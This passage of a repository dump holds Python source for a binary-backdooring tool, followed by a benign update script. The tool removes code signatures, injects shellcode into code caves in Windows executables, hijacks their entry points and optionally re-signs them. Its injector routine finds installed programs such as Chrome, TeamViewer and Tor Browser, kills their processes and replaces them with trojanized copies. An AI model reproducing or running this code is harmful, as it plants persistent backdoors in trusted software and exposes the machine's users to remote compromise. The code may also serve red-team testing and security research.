is True and self.flItms['CertLOC'] != 0:\n            with open(self.flItms['backdoorfile'], \"r+b\") as self.binary:\n                self.gather_file_info_win()\n                print \"[*] Overwriting certificate table pointer\"\n                self.binary.seek(-self.flItms['CertSize'], os.SEEK_END)\n                self.binary.truncate()\n                self.binary.seek(self.flItms['CertTableLOC'], 0)\n                self.binary.write(\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\n\n    def patch_pe(self):\n\n        \"\"\"\n        This function operates the sequence of all involved\n        functions to perform the binary patching.\n        \"\"\"\n        print \"[*] In the backdoor module\"\n        # TODO: Take out Injector\n\n        if self.INJECTOR is False:\n            os_name = os.name\n            if not os.path.exists(\"backdoored\"):\n                os.makedirs(\"backdoored\")\n            if os_name == 'nt':\n                self.OUTPUT = \"backdoored\\\\\" + self.OUTPUT\n            else:\n                self.OUTPUT = \"backdoored/\" + self.OUTPUT\n\n        if self.PATCH_METHOD.lower() == 'replace':\n            print \"[*] Using replace method, copying supplied binary\"\n            self.flItms['backdoorfile'] = self.SUPPLIED_BINARY\n            shutil.copy2(self.SUPPLIED_BINARY, self.OUTPUT)\n            return True\n\n        issupported = self.support_check()\n\n        if issupported is False:\n            return None\n\n        if self.PREPROCESS is True:\n            self.preprocess()\n        \n        if self.PATCH_METHOD == 'onionduke':\n            print \"[!] Attempting OnionDuke patching\"\n            # move OS check here.\n            result = self.onionduke()\n            if result:\n                return result\n            else:\n                print \"[!] OnionDuke patching failed\"\n                return result\n\n        self.flItms['NewCodeCave'] = self.ADD_SECTION\n        self.flItms['cave_jumping'] = self.CAVE_JUMPING\n        self.flItms['CavesPicked'] = {}\n        self.flItms['LastCaveAddress'] = 0\n        self.flItms['stager'] = False\n        self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE\n        self.flItms['CavesToFix'] = {}\n        self.flItms['XP_MODE'] = self.XP_MODE\n\n        #pulling apis\n        if self.check_shells() is False:\n            return False\n\n        #Creating file to backdoor\n        self.flItms['backdoorfile'] = self.OUTPUT\n        shutil.copy2(self.FILE, self.flItms['backdoorfile'])\n        # Delete tempfile here\n        \n        #Removing the cert is better early on\n        self.remove_signing()\n\n        if 'apis_needed' in self.flItms:\n            self.check_apis(self.FILE)\n            iat_result = ''\n            if \"UPX\".lower() in self.flItms['textSectionName'].lower():\n                print \"[!] Cannot patch a new IAT into a UPX binary at this time.\"\n                return False\n            if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is True:\n                iat_result = self.patch_in_new_iat()\n                print \"[*] Checking updated IAT for thunks\"\n                self.check_apis(self.flItms['backdoorfile'])\n\n            # if this IDT_IN_CAVE is true and it did not work... reset and go normal route\n            if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is True:\n                print \"[!] Resetting the file\"\n                shutil.copy2(self.FILE, self.flItms['backdoorfile'])\n                self.remove_signing()\n                iat_result = self.create_new_iat()\n                if iat_result is False:\n                    return False\n                print \"[*] Checking updated IAT for thunks\"\n                self.check_apis(self.flItms['backdoorfile'])\n\n            if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is False:\n                #reset the file\n                iat_result = self.create_new_iat()\n                if iat_result is False:\n                    return False\n                print \"[*] Checking updated IAT for thunks\"\n                self.check_apis(self.flItms['backdoorfile'])\n\n        if self.set_shells() is False or self.flItms['allshells'] is False:\n            print \"[!] Could not set selected shellcode!\"\n            return False\n\n        self.binary = open(self.flItms['backdoorfile'], \"r+b\")\n\n        if self.RUNAS_ADMIN is True:\n            if self.parse_rsrc() is True:\n                patch_result = self.patch_runlevel()\n                if patch_result is False:\n                    print \"[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist\"\n            else:\n                print '[!] No manifest in rsrc'\n\n        #reserve space for shellcode\n        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)\n\n        if self.flItms['Magic'] == int('20B', 16):\n            _, self.flItms['resumeExe'] = targetFile.resume_execution_64()\n        else:\n            _, self.flItms['resumeExe'] = targetFile.resume_execution_32()\n\n        shellcode_length = len(self.flItms['shellcode'])\n\n        self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])\n\n        caves_set = False\n\n        # This can be improved. TODO: add parsed caves to a tracking dict\n        #  for \"single\": [caves] and \"jump\": [caves] for that parsing\n        #  does not have to happen over and over again.\n        #  Also think about removing None from the equation?\n        while caves_set is False and self.flItms['NewCodeCave'] is False:\n            self.flItms['CavesPicked'] = self.find_cave()\n            if type(self.flItms['CavesPicked']) == str:\n                if self.flItms['CavesPicked'].lower() in ['append', 'a']:\n                    self.flItms['JMPtoCodeAddress'] = None\n                    self.flItms['CodeCaveLOC'] = 0\n                    self.flItms['cave_jumping'] = False\n                    self.flItms['CavesPicked'] = {}\n                    print \"[!] Appending new section for payload\"\n                    self.set_shells()\n                    caves_set = True\n                elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:\n                    self.flItms['JMPtoCodeAddress'] = None\n                    self.flItms['CodeCaveLOC'] = 0\n                    self.flItms['cave_jumping'] = True\n                    self.flItms['CavesPicked'] = {}\n                    print \"-resetting shells\"\n                    self.set_shells()\n                    continue\n                elif self.flItms['CavesPicked'].lower() in ['single', 's']:\n                    self.flItms['JMPtoCodeAddress'] = None\n                    self.flItms['CodeCaveLOC'] = 0\n                    self.flItms['cave_jumping'] = False\n                    self.flItms['CavesPicked'] = {}\n                    print \"-resetting shells\"\n                    self.set_shells()\n                    continue\n                elif self.flItms['CavesPicked'].lower() in ['ignore', 'i', 'q']:\n                    #Let's say we don't want to patch a binary\n                    return None\n            elif self.flItms['CavesPicked'] is None:\n                return None\n            else:\n                self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]\n                caves_set = True\n            #else:\n            #    caves_set = True\n\n        # Assigning code caves to fix\n        if self.flItms['CavesPicked'] != {}:\n            for cave, values in self.flItms['CavesPicked'].iteritems():\n                self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['PatchLocation'], self.flItms['len_allshells'][cave]]\n\n        #If no cave found, continue to create one.\n        if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:\n            create_cave_result = self.create_code_cave()\n            if create_cave_result is False:\n                return False\n            self.flItms['NewCodeCave'] = True\n            print \"- Adding a new section to the exe/dll for shellcode injection\"\n        else:\n            self.flItms['LastCaveAddress'] = self.flItms['CavesPicked'][len(self.flItms['CavesPicked']) - 1][6]\n\n        #Patch the entry point\n        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)\n        targetFile.patch_initial_instructions()\n\n        # recalling resumeExe\n        if self.flItms['Magic'] == int('20B', 16):\n            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()\n        else:\n            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()\n\n        # setting the final shellcode\n        self.set_shells()\n\n        if self.flItms['cave_jumping'] is True:\n            if self.flItms['stager'] is False:\n                temp_jmp = \"\\xe9\"\n                breakupvar = eat_code_caves(self.flItms, 1, 2)\n                test_length = int(self.flItms['CavesPicked'][2][1], 16) - int(self.flItms['CavesPicked'][1][1], 16) - len(self.flItms['allshells'][1]) - 5\n                if test_length < 0:\n                    temp_jmp += struct.pack(\"<I\", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))\n                else:\n                    temp_jmp += struct.pack(\"<I\", breakupvar - len(self.flItms['allshells'][1]) - 5)\n            self.flItms['allshells'] += (self.flItms['resumeExe'], )\n\n        self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']\n        if self.flItms['NewCodeCave'] is True:\n            self.binary.seek(self.flItms['newSectionPointerToRawData'] + self.flItms['buffer'])\n            self.binary.write(self.flItms['completeShellcode'])\n        if self.flItms['cave_jumping'] is True:\n            for i, item in self.flItms['CavesPicked'].iteritems():\n                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16), 0)\n                self.binary.write(self.flItms['allshells'][i])\n                #So we can jump to our resumeExe shellcode\n                if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:\n                    self.binary.write(temp_jmp)\n        else:\n            for i, item in self.flItms['CavesPicked'].iteritems():\n                if i == 0:\n                    self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))\n                    self.binary.write(self.flItms['completeShellcode'])\n\n        self.binary.close()\n\n        if self.CODE_SIGN is True:\n\t\t\t# cert was removed earlier \n            p = subprocess.Popen(['osslsigncode', '-certs', self.flItms['curdir'] + '/' + 'certs/signingCert.cer', '-key', \\\n                                  self.flItms['curdir'] + '/' + 'certs/signingPrivateKey.pem', '-n', 'Security','-in', \\\n                                   self.flItms[\"backdoorfile\"], '-out', self.flItms[\"backdoorfile\"], '-readpass', self.flItms['curdir'] + '/' + 'certs/passFile.txt'] \\\n                                 , stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            p.wait()\n            out, err = p.communicate()\n            if 'succeeded' in out.lower():\n                print \"[*] Code Signing Succeeded\"\n            else:\n                print \"[!!!!] Code Signing Failed check your certs [!!!!]\" \n                print str(err).strip(\"\\n\")\n\n        if self.VERBOSE is True:\n            self.print_flItms(self.flItms)\n\n        # CHECK AND DELETE TMP FILE HERE\n            \n        if self.tmp_file != None:\n        \n            if self.keep_temp is True:\n                # tmpfilename_orginalname.exe\n                print \"[*] Saving TempFile to:\", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE \n                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )\n            try:\n                shutil.rmtree(self.tmp_file.name)\n            except: # OSError:\n                pass\n                #print \"[*] TempFile already removed.\"\n\n        \n        return True\n\n    def output_options(self):\n        \"\"\"\n        Output file check.\n        \"\"\"\n        if not self.OUTPUT:\n            self.OUTPUT = os.path.basename(self.FILE)\n\n    def check_shells(self):\n        \"\"\"\n        checks shellcode selection\n        \"\"\"\n\n        avail_shells = []\n\n        #it's time to use a python properties TODO\n        ignores = [\"returnshellcode\", \"pack_ip_addresses\",\n                   \"eat_code_caves\", \"ones_compliment\",\n                   \"ones_compliment\", \"resume_execution\"\n                   \"returnshellcode\", \"clean_caves_stub\"\n                   ]\n\n        if self.flItms['Magic'] == int('10B', 16):\n            self.flItms['bintype'] = winI32_shellcode\n        if self.flItms['Magic'] == int('20B', 16):\n            self.flItms['bintype'] = winI64_shellcode\n        if not self.SHELL:\n            print \"You must choose a backdoor to add: (use -s)\"\n            for item in dir(self.flItms['bintype']):\n                if \"__\" in item:\n                    continue\n                elif item in ignores:\n                    continue\n                else:\n                    print \"   {0}\".format(item)\n            return False\n\n        if self.SHELL not in dir(self.flItms['bintype']):\n            print \"The following %ss are available: (use -s)\" % str(self.flItms['bintype']).split(\".\")[1]\n            for item in dir(self.flItms['bintype']):\n                if \"__\" in item:\n                    continue\n                elif item in ignores:\n                    continue\n                else:\n                    print \"   {0}\".format(item)\n                    avail_shells.append(item)\n            self.flItms['avail_shells'] = avail_shells\n            return False\n\n        getattr(self.flItms['bintype'](\"127.0.0.1\", 8080, self.SUPPLIED_SHELLCODE), self.SHELL)(self.flItms, self.flItms['CavesPicked'])\n\n    def set_shells(self):\n        \"\"\"\n        This function sets the shellcode.\n        \"\"\"\n        print \"[*] Looking for and setting selected shellcode\"\n\n        if self.check_shells() is False:\n            return False\n        #else:\n        #    shell_cmd = self.SHELL + \"()\"\n        self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)\n        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])\n        self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()\n        return True\n\n    #  TODO: Take this out and make it a standalone script\n    def injector(self):\n        \"\"\"\n        The injector module will hunt and injection shellcode into\n        targets that are in the list_of_targets dict.\n        Data format DICT: {process_name_to_backdoor :\n                           [('dependencies to kill', ),\n                           'service to kill', restart=True/False],\n                           }\n        \"\"\"\n\n        list_of_targets = {'chrome.exe':\n                           [('chrome.exe', ), None, True], 'hamachi-2.exe':\n                           [('hamachi-2.exe', ), \"Hamachi2Svc\", True],\n                           'tcpview.exe': [('tcpview.exe',), None, True],\n                           #'rpcapd.exe':\n                           #[('rpcapd.exe'), None, False],\n                           'psexec.exe':\n                           [('psexec.exe',), 'PSEXESVC.exe', False],\n                           'vncserver.exe':\n                           [('vncserver.exe', ), 'vncserver', True],\n                           # must append code cave for vmtoolsd.exe\n\n                           'vmtoolsd.exe':\n                           [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],\n\n                           'nc.exe': [('nc.exe', ), None, False],\n\n                           'Start Tor Browser.exe':\n                           [('Start Tor Browser.exe', ), None, False],\n\n                           'procexp.exe': [('procexp.exe',\n                                            'procexp64.exe'), None, True],\n\n                           'procmon.exe': [('procmon.exe',\n                                            'procmon64.exe'), None, True],\n\n                           'TeamViewer.exe': [('tv_x64.exe',\n                                               'tv_x32.exe'), None, True]\n                           }\n\n        print \"[*] Beginning injector module\"\n        os_name = os.name\n        if os_name == 'nt':\n            if \"PROGRAMFILES(x86)\" in os.environ:\n                print \"-You have a 64 bit system\"\n                system_type = 64\n            else:\n                print \"-You have a 32 bit system\"\n                system_type = 32\n        else:\n            print \"This works only on windows. :(\"\n            sys.exit()\n        winversion = platform.version()\n        rootdir = os.path.splitdrive(sys.executable)[0]\n        targetdirs = []\n        excludedirs = []\n        winXP2003x86targetdirs = [rootdir + '\\\\']\n        winXP2003x86excludedirs = [rootdir + '\\\\Windows\\\\',\n                                   rootdir + '\\\\RECYCLER\\\\',\n                                   '\\\\VMWareDnD\\\\']\n        vista7win82012x64targetdirs = [rootdir + '\\\\']\n        vista7win82012x64excludedirs = [rootdir + '\\\\Windows\\\\',\n                                        rootdir + '\\\\RECYCLER\\\\',\n                                        '\\\\VMwareDnD\\\\']\n\n        #need win2003, win2008, win8\n        if \"5.0.\" in winversion:\n            print \"-OS is 2000\"\n            targetdirs = targetdirs + winXP2003x86targetdirs\n            excludedirs = excludedirs + winXP2003x86excludedirs\n        elif \"5.1.\" in winversion:\n            print \"-OS is XP\"\n            if system_type == 64:\n                targetdirs.append(rootdir + '\\\\Program Files (x86)\\\\')\n                excludedirs.append(vista7win82012x64excludedirs)\n            else:\n                targetdirs = targetdirs + winXP2003x86targetdirs\n                excludedirs = excludedirs + winXP2003x86excludedirs\n        elif \"5.2.\" in winversion:\n            print \"-OS is 2003\"\n            if system_type == 64:\n                targetdirs.append(rootdir + '\\\\Program Files (x86)\\\\')\n                excludedirs.append(vista7win82012x64excludedirs)\n            else:\n                targetdirs = targetdirs + winXP2003x86targetdirs\n                excludedirs = excludedirs + winXP2003x86excludedirs\n        elif \"6.0.\" in winversion:\n            print \"-OS is Vista/2008\"\n            if system_type == 64:\n                targetdirs = targetdirs + vista7win82012x64targetdirs\n                excludedirs = excludedirs + vista7win82012x64excludedirs\n            else:\n                targetdirs.append(rootdir + '\\\\Program Files\\\\')\n                excludedirs.append(rootdir + '\\\\Windows\\\\')\n        elif \"6.1.\" in winversion:\n            print \"-OS is Win7/2008\"\n            if system_type == 64:\n                targetdirs = targetdirs + vista7win82012x64targetdirs\n                excludedirs = excludedirs + vista7win82012x64excludedirs\n            else:\n                targetdirs.append(rootdir + '\\\\Program Files\\\\')\n                excludedirs.append(rootdir + '\\\\Windows\\\\')\n        elif \"6.2.\" in winversion:\n            print \"-OS is Win8/2012\"\n            targetdirs = targetdirs + vista7win82012x64targetdirs\n            excludedirs = excludedirs + vista7win82012x64excludedirs\n\n        filelist = set()\n\n        exclude = False\n        for path in targetdirs:\n            for root, subFolders, files in os.walk(path):\n                for directory in excludedirs:\n                    if directory.lower() in root.lower():\n                        exclude = True\n                        break\n                if exclude is False:\n                    for _file in files:\n                        f = os.path.join(root, _file)\n                        for target, items in list_of_targets.iteritems():\n                            if target.lower() == _file.lower():\n                                print \"-- Found the following file:\", root + '\\\\' + _file\n                                filelist.add(f)\n\n                exclude = False\n\n        #grab tasklist\n        process_list = []\n        all_process = os.popen(\"tasklist.exe\")\n        ap = all_process.readlines()\n        all_process.close()\n        ap.pop(0)   # remove blank line\n        ap.pop(0)   # remove header line\n        ap.pop(0)   # remove this ->> =======\n\n        for process in ap:\n            process_list.append(process.split())\n\n        for target in filelist:\n            service_target = False\n            running_proc = False\n            #get filename\n            #support_result = support_check(target, 0)\n            #if support_result is False:\n            #   continue\n            filename = os.path.basename(target)\n            for process in process_list:\n                for setprocess, items in list_of_targets.iteritems():\n                    if setprocess.lower() in target.lower():\n                        for item in items[0]:\n                            if item.lower() in [x.lower() for x in process]:\n                                print \"- Killing process:\", item\n                                try:\n                                    os.system(\"taskkill /F /PID %i\" %\n                                              int(process[1]))\n                                    running_proc = True\n                                except Exception as e:\n                                    print str(e)\n                        if setprocess.lower() in [x.lower() for x in process]:\n                            if items[1] is not None:\n                                print \"- Killing Service:\", items[1]\n                                try:\n                                    os.system('net stop %s' % items[1])\n                                except Exception as e:\n                                    print str(e)\n                                service_target = True\n\n            time.sleep(1)\n            #backdoor the targets here:\n            print \"*\" * 50\n            self.FILE = target\n            self.OUTPUT = os.path.basename(self.FILE + '.bd')\n            print \"self.OUTPUT\", self.OUTPUT\n            print \"- Backdooring:\", self.FILE\n            result = self.patch_pe()\n            if result:\n                pass\n            else:\n                continue\n            shutil.copy2(self.FILE, self.FILE + self.SUFFIX)\n            os.chmod(self.FILE, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)\n            time.sleep(1)\n            try:\n                os.unlink(self.FILE)\n            except:\n                print \"unlinking error\"\n            time.sleep(.5)\n            try:\n                shutil.copy2(self.OUTPUT, self.FILE)\n            except:\n                os.system('move {0} {1}'.format(self.FILE, self.OUTPUT))\n            time.sleep(.5)\n            os.remove(self.OUTPUT)\n            print (\" - The original file {0} has been renamed to {1}\".format(self.FILE,\n                   self.FILE + self.SUFFIX))\n\n            if self.DELETE_ORIGINAL is True:\n                print \"!!Warning Deleteing Original File!!\"\n                os.remove(self.FILE + self.SUFFIX)\n\n            if service_target is True:\n                os.system('net start %s' % list_of_targets[filename][1])\n            else:\n                try:\n                    if (list_of_targets[filename][2] is True and\n                       running_proc is True):\n                        subprocess.Popen([self.FILE, ])\n                        print \"- Restarting:\", self.FILE\n                    else:\n                        print \"-- %s was not found online -  not restarting\" % self.FILE\n\n                except:\n                    if (list_of_targets[filename.lower()][2] is True and\n                       running_proc is True):\n                        subprocess.Popen([self.FILE, ])\n                        print \"- Restarting:\", self.FILE\n                    else:\n                        print \"-- %s was not found online -  not restarting\" % self.FILE\n"
        },
        {
          "name": "preprocessor",
          "type": "tree",
          "content": null
        },
        {
          "name": "update.sh",
          "type": "blob",
          "size": 0.8154296875,
          "content": "#!/usr/bin/env bash\n\nif [[ $EUID -ne 0 ]]; then\n  echo \"You must root\" 2>&1\n  exit 1\nfi\n\n#update capstone\n\ncd capstone\n\n\nif [[ `git pull` != \"Already up-to-date.\" ]]; then\n\n\tgit checkout b53a59af53ffbd5dbe8dbcefba41a00cf4fc7469\n\n\t./make.sh\n\n\t./make.sh install\n\n\tuname -a | grep BSD &> /dev/null\n\tif [ $? -eq 0 ]; then\n\t\techo 'Installing Capstone python bindings for *bsd'\n\t\trm -rf ./build\n\t\tpython setup.py build -b ./build install\n\telse\n\t\tmake install\n\tfi\n\n\t#check if kali\n\tuname -a | grep -i kali &> /dev/null \n\tif [ $? -eq 0 ]; then\n\t\techo \"Adding capstone path for Kali64 in /etc/ls.so.conf.d/capstone.conf\"\n\t\techo \"#capstone shared libs\" >> /etc/ld.so.conf.d/capstone.conf\n\t\techo \"/usr/lib64\" >> /etc/ld.so.conf.d/capstone.conf\n\t\tldconfig\n\tfi\nelse\n\techo \"Capstone is up-to-date.\"\nfi\n\n# update pefile\n\npip install --upgrade pefile\n"
        },
        {
          "name": "winapi",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}